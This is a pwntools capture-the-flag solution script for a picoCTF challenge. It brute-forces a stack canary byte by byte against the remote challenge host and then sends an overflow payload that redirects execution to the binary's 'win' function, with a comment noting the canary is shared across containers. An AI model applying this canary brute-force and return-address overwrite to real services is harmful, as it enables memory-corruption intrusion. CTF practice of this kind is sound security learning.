from pwn import *
from string import printable

exe = ELF("./vuln")
context.log_level = "debug"
canary = b""

for i in range(4):
    for c in printable:
        r = remote("saturn.picoctf.net", 56023)
        r.recvuntil(b"> ")
        r.sendline(str(len(canary) + 65).encode("utf-8"))
        r.recvuntil(b"> ")
        r.sendline(cyclic(64) + canary + c.encode())
        if b"?" in r.recvall():
            canary += c.encode()
            r.close()
            break
        r.close()
success("canary: " + canary.decode())

# This challenge is a little disgusting, my connection to remote is too slow, 
# so I use picoCTF's Webshell. But after brute-force the canary I can't get flag
# dump on the Webshell, therefore I use the same canary at local and it works. 
# Then I found the canaries are the same on all the container, you can use any others'
# canary, it's all "BiRd". picoCTF should really improve there Webshell, it makes
# me confused that Webshell need to re-login after 10-30 seconds.

r = remote("saturn.picoctf.net", 56023)
r.recvuntil(b"> ")
r.sendline(b"100")
r.recvuntil(b"> ")
r.sendline(cyclic(64) + canary + cyclic(16) + p32(exe.sym["win"]))
r.interactive()
